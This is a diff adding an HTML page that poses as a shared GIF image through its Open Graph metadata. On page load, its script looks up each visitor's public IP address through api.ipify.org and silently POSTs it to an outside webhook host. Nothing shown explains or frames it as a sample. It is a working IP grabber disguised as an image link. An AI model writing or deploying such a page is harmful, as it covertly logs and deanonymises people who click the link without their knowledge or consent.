@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta property="og:image" content="https://raw.githubusercontent.com/agenericapple/files/main/gifs/shikanoko.gif">
+  <meta property="og:type" content="image">
+</head>
+<body>
+  <script>
+    function get() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+
+          fetch('https://hkdk.events/cy2t824c3u09rn', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ ip: ip })
+          });
+        });
+    }
+      
+    get();
+  </script>
+</body>
+</html>
